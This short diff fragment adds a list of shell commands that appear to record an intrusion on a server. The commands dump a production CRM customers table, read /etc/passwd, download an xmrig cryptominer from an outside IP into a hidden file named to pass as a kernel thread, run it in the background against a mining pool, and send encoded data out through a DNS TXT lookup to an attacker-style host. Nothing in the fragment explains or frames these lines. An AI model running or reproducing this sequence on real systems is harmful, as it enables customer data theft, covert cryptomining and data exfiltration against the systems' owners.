@@ -1,0 +1,8 @@
+psql -U postgres -c "SELECT version();"
+psql -U app_svc -d crm_production -c "SELECT * FROM customers;"
+cat /etc/passwd
+uname -a
+curl -s http://198.51.100.45:8443/xmrig -o /tmp/.kworker
+chmod +x /tmp/.kworker
+nohup /tmp/.kworker --donate-level 0 -o pool.evil.example.com:3333 &
+dig TXT aHR0cDovL2V4ZmlsLmV4YW1wbGUu.t.evil.example.com
